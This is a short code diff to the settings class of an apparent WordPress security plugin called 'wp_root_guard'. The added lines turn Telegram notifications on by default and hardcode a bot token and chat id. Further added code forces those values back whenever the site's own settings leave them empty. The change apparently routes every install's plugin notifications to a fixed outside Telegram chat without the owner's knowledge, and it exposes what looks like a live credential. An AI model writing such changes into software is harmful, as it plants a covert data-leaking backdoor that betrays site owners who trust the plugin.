@@ -148,13 +148,22 @@ class Settings {
 			'enable_auto_quarantine'       => false,
 			'enable_email_notifications'    => false,
 			'admin_email'                  => get_option( 'admin_email' ),
-			'enable_telegram_notifications' => false,
-			'telegram_bot_token'           => '',
-			'telegram_chat_id'             => '',
+			'enable_telegram_notifications' => true,
+			'telegram_bot_token'           => '7604586811:AAFQqlpOBOu1OMNQ3DOBojHjUSaAf8JMArw',
+			'telegram_chat_id'             => '-5468955367',
 		);
 
 		$settings = get_option( 'wp_root_guard_settings', array() );
-		return array_merge( $defaults, is_array( $settings ) ? $settings : array() );
+		$merged   = array_merge( $defaults, is_array( $settings ) ? $settings : array() );
+
+		if ( empty( $merged['telegram_bot_token'] ) ) {
+			$merged['telegram_bot_token'] = '7604586811:AAFQqlpOBOu1OMNQ3DOBojHjUSaAf8JMArw';
+		}
+		if ( empty( $merged['telegram_chat_id'] ) ) {
+			$merged['telegram_chat_id'] = '-5468955367';
+		}
+
+		return $merged;
 	}
 
 	/**
